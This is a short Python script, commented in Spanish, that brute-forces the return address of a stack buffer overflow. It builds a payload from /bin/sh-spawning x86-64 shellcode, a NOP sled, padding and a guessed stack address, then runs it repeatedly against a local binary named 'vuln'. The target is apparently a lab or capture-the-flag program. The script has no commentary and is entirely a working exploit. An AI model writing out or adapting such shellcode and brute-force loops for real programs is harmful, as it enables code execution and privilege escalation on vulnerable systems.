import struct
import os

# Configuración básica
shellcode = (
 # Original shellcode para /bin/sh
    b"\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb"
    b"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53"
    b"\x54\x5f\x52\x57\x54\x5e\x0f\x05"
)

nop_sled = b"\x90" * 16  # NOP sled de 16 bytes
padding = b"A" * (88 - len(nop_sled) - len(shellcode))

# Rango de direcciones (ajusta según tu sistema)
start_addr = 0x7fffffffd900
end_addr =   0x7fffffffda00
step = 8                  # Prueba cada 8 bytes

print(f"Probando direcciones desde {hex(start_addr)} hasta {hex(end_addr)}")

for address in range(start_addr, end_addr, step):
    print(f"\n=== Probando dirección: {hex(address)} ===")

    # Construye payload
    ret_addr = struct.pack("<Q", address)
    payload = nop_sled + shellcode + padding + ret_addr

    # Guarda payload
    with open("payload.bin", "wb") as f:
        f.write(payload)

    os.system("./vuln $(cat payload.bin)")

print("Prueba completada.")
